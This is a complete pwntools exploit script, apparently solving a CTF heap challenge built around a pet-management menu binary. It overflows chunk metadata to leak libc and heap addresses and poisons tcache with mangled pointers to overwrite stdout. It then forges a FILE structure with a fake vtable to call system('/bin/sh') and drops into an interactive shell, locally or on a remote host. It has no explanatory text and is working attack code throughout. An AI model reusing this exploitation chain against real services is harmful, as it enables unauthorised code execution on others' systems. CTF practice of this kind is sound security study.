```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from ctypes import CDLL

exe = context.binary = ELF('chall_patched')
libc = exe.libc
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], ssl=True, *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-gef
brva 0x2174
commands
    b *_IO_wdoallocbuf
end
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()

def add_pet(size, name):
    io.sendlineafter(b">>>", b"1")
    io.sendlineafter(b":", str(size).encode())
    io.sendlineafter(b":", name)
    io.sendlineafter(b":", b"1337")
    io.sendlineafter(b":", b"M")
    io.sendlineafter(b":", b"hack")
    io.sendlineafter(b":", b"bark")

def show_pet(idx):
    io.sendlineafter(b">>>", b"3")
    io.sendlineafter(b":", str(idx).encode())
    io.recvuntil(b"Name: ")
    data = io.recv(6)
    return u64(data.ljust(8, b"\x00"))

def edit_pet(idx, size, name):
    io.sendlineafter(b">>>", b"4")
    io.sendlineafter(b":", str(idx).encode())
    io.sendlineafter(b":", str(size).encode())
    io.sendlineafter(b":", name)

def free_pet(idx):
    io.sendlineafter(b">>>", b"5")
    io.sendlineafter(b":", str(idx).encode())

def mangle(heap_addr, val):
    return (heap_addr >> 12) ^ val  


def solve():

    add_pet(0x18, b"A"*0x18)
    add_pet(0x500, b"A"*0x10)
    add_pet(0x20, b"A"*0x10)
    add_pet(0x10, b"A"*0x10)

    edit_pet(0, -1, b"A"*0x18 + p64(0x541))
    free_pet(1)
    add_pet(0x500, b"junk")
    main_arena = show_pet(2)
    libc_base = main_arena - 0x203b20
    info("libc base: %#x", libc_base)

    add_pet(0x10, b"B"*8)
    free_pet(4)
    heap_base = show_pet(2) & 0xffffffffff
    heap_base <<= 12
    info("heap base: %#x", heap_base)

    stdout = mangle(heap_base, libc.sym["_IO_2_1_stdout_"] + libc_base)

    edit_pet(2, 0x10, p64(0) * 2)
    free_pet(2)

    chunk = b"A"*0x18 + p64(0x511) + p64(0) * 161 + p64(0x31) + p64(stdout)
    edit_pet(0, -1, chunk)

    for _ in range(2):
        add_pet(0x20, p64(0xfbad2887))

    _IO_wfile_jumps = libc_base + libc.sym["_IO_wfile_jumps"]
    _IO_2_1_stdout_ = libc_base + libc.sym["_IO_2_1_stdout_"]

    stdout_lock = libc_base + libc.sym["_IO_stdfile_1_lock"]
    stdout = _IO_2_1_stdout_
    fake_vtable = _IO_wfile_jumps - 0x18
    gadget = libc_base + 0x1724f0 # add rdi, 0x10 ; jmp rcx

    fake                = FileStructure(0)
    fake.flags          = 0x3b01010101010101
    fake._IO_read_end   = libc_base + libc.sym['system']      
    fake._IO_save_base  = gadget
    fake._IO_write_end  = u64(b'/bin/sh\x00') 
    fake._lock          = stdout_lock
    fake._codecvt       = stdout + 0xb8
    fake._wide_data     = stdout+0x200    
    fake.unknown2       = p64(0)*2+p64(stdout+0x20)+p64(0)*3+p64(fake_vtable)

    edit_pet(4, -1, bytes(fake))    

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()
```